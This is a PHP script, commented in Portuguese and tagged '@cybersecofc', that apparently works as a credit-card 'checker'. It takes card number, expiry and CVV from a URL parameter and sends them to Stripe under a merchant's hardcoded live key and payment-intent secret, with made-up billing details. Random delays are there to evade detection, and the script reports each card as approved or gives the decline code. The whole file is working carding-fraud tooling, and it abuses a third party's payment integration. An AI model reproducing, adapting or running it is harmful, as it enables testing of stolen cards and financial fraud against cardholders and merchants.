<?php
error_reporting(0);
ignore_user_abort(true);

// ==================== CONFIGURAÇÕES ====================
define('STRIPE_PUBLIC_KEY', 'pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz');
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0');
define('TAG', '@cybersecofc');
define('DEBUG', false); // Mude para true apenas se quiser ver respostas detalhadas
define('DELAY_MIN', 15); // Delay mínimo em segundos
define('DELAY_MAX', 28); // Delay máximo em segundos

// ==================== DELAY INICIAL ====================
$delay_inicial = rand(DELAY_MIN, DELAY_MAX);
sleep($delay_inicial);

// ==================== PROCESSAR LISTA ====================
if (!isset($_GET['lista']) || empty($_GET['lista'])) {
    die("ERRO: Lista não fornecida");
}

$lista = $_GET['lista'];
$lista = str_replace(" ", "|", $lista);
$lista = str_replace("%20", "|", $lista);
$separar = explode("|", $lista);

if (count($separar) < 4) {
    die("ERRO: Formato inválido. Use cc|mes|ano|cvv");
}

$cc = trim(preg_replace('/[^0-9]/', '', $separar[0]));
$mes = trim($separar[1]);
$ano = trim($separar[2]);
$cvv = trim(preg_replace('/[^0-9]/', '', $separar[3]));

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = '20' . $ano;

// ==================== DETECTAR BANDEIRA ====================
$last4 = substr($cc, -4);
$primeiro_digito = substr($cc, 0, 1);
$primeiros_2 = substr($cc, 0, 2);
$primeiros_4 = substr($cc, 0, 4);
$brand = 'DESCONHECIDA';

if ($primeiro_digito == '4') {
    $brand = 'VISA';
} elseif ($primeiro_digito == '5') {
    $brand = 'MASTERCARD';
} elseif ($primeiro_digito == '3') {
    if ($primeiros_2 == '34' || $primeiros_2 == '37') {
        $brand = 'AMEX';
    } elseif ($primeiros_2 == '36' || $primeiros_2 == '38' || in_array(substr($cc,0,3), ['300','301','302','303','304','305'])) {
        $brand = 'DINERS';
    } else {
        $brand = 'JCB';
    }
} elseif ($primeiro_digito == '6') {
    if ($primeiros_4 == '6011' || in_array(substr($cc,0,3), ['644','645','646','647','648','649']) || $primeiros_2 == '65') {
        $brand = 'DISCOVER';
    } else {
        $brand = 'RUPAY';
    }
} elseif (in_array($primeiros_2, ['50','60','67'])) {
    $brand = 'ELO';
}

$cartao_formatado = "$cc|$mes|" . substr($ano, -2) . "|$cvv";
$clientSessionId = '33c245cd-eb0b-485f-b3d8-6ada02c742b4';
$tempo_inicial = microtime(true);

// ==================== PASSO 1: CRIAR PAYMENT METHOD ====================
$url_pm = "https://api.stripe.com/v1/payment_methods";

$pm_data = http_build_query([
    'type' => 'card',
    'card[number]' => $cc,
    'card[exp_month]' => $mes,
    'card[exp_year]' => $ano,
    'card[cvc]' => $cvv,
    'billing_details[email]' => 'sebode6446@gmail.com',
    'billing_details[name]' => 'cyber sec',
    'billing_details[address][line1]' => 'jessy lyssy',
    'billing_details[address][city]' => 'Belo horizonte',
    'billing_details[address][state]' => 'IL',
    'billing_details[address][postal_code]' => '10100',
    'billing_details[address][country]' => 'US',
    'key' => STRIPE_PUBLIC_KEY
]);

$headers_pm = [
    'Host: api.stripe.com',
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'user-agent: ' . USER_AGENT,
];

$ch_pm = curl_init();
curl_setopt_array($ch_pm, [
    CURLOPT_URL => $url_pm,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => $headers_pm,
    CURLOPT_POSTFIELDS => $pm_data,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_TIMEOUT => 30,
]);

$response_pm = curl_exec($ch_pm);
$http_pm = curl_getinfo($ch_pm, CURLINFO_HTTP_CODE);
curl_close($ch_pm);

if (DEBUG) {
    echo "=== PAYMENT METHOD RESPONSE ===\n";
    echo "HTTP Code: $http_pm\n";
    echo "Response: $response_pm\n";
    echo "===============================\n\n";
}

$pm_data = json_decode($response_pm, true);
$payment_method_id = $pm_data['id'] ?? null;

if (!$payment_method_id || $http_pm != 200) {
    $tempo_total = round(microtime(true) - $tempo_inicial, 2);
    $erro_msg = $pm_data['error']['message'] ?? 'Falha ao criar payment method';
    $saida = "$cartao_formatado - ERRO: $erro_msg ($brand) - Final $last4 ({$tempo_total}s) " . TAG;
    echo $saida;
    exit();
}

// ==================== DELAY ANTES DE CONFIRMAR ====================
$delay_confirm = rand(DELAY_MIN, DELAY_MAX);
sleep($delay_confirm);

// ==================== PASSO 2: CONFIRMAR PAYMENT INTENT ====================
$url_confirm = "https://api.stripe.com/v1/payment_intents/pi_3T0r26B7LFlNoUGL08UGquNx/confirm";

$confirm_data = http_build_query([
    'payment_method' => $payment_method_id,
    'use_stripe_sdk' => 'true',
    'mandate_data[customer_acceptance][type]' => 'online',
    'mandate_data[customer_acceptance][online][infer_from_client]' => 'true',
    'key' => STRIPE_PUBLIC_KEY,
    'client_attribution_metadata[client_session_id]' => $clientSessionId,
    'client_attribution_metadata[merchant_integration_source]' => 'l1',
    'client_secret' => 'pi_3T0r26B7LFlNoUGL08UGquNx_secret_UGYtxTalmJWed5KmChrOHMX5B'
]);

$headers_confirm = [
    'Host: api.stripe.com',
    'sec-ch-ua-platform: "Windows"',
    'user-agent: ' . USER_AGENT,
    'accept: application/json',
    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
    'content-type: application/x-www-form-urlencoded',
    'sec-ch-ua-mobile: ?0',
    'origin: https://js.stripe.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://js.stripe.com/',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i'
];

$ch_confirm = curl_init();
curl_setopt_array($ch_confirm, [
    CURLOPT_URL => $url_confirm,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => $headers_confirm,
    CURLOPT_POSTFIELDS => $confirm_data,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_ENCODING => 'gzip, deflate',
]);

$response_confirm = curl_exec($ch_confirm);
$http_confirm = curl_getinfo($ch_confirm, CURLINFO_HTTP_CODE);
$error_confirm = curl_error($ch_confirm);
curl_close($ch_confirm);

$tempo_total = round(microtime(true) - $tempo_inicial, 2);

if (DEBUG) {
    echo "=== CONFIRM RESPONSE ===\n";
    echo "HTTP Code: $http_confirm\n";
    echo "Response: $response_confirm\n";
    echo "========================\n\n";
}

// ==================== PROCESSAR RESPOSTA ====================
$result_message = '';

if ($error_confirm) {
    $result_message = "ERRO CURL: $error_confirm";
} elseif ($response_confirm) {
    $data = json_decode($response_confirm, true);
    
    if (isset($data['error'])) {
        $error_data = $data['error'];
        $decline_code = $error_data['decline_code'] ?? '';
        
        if (!empty($decline_code)) {
            $result_message = strtoupper($decline_code);
        } else {
            $result_message = 'DECLINED';
        }
    } elseif (isset($data['status']) && $data['status'] == 'succeeded') {
        $result_message = 'APROVADA';
    } else {
        $result_message = 'RESPOSTA_INVALIDA';
    }
}

// ==================== SAÍDA FINAL ====================
$saida = "$cartao_formatado - $result_message ($brand) - Final $last4 ({$tempo_total}s) " . TAG;
echo $saida;

?>
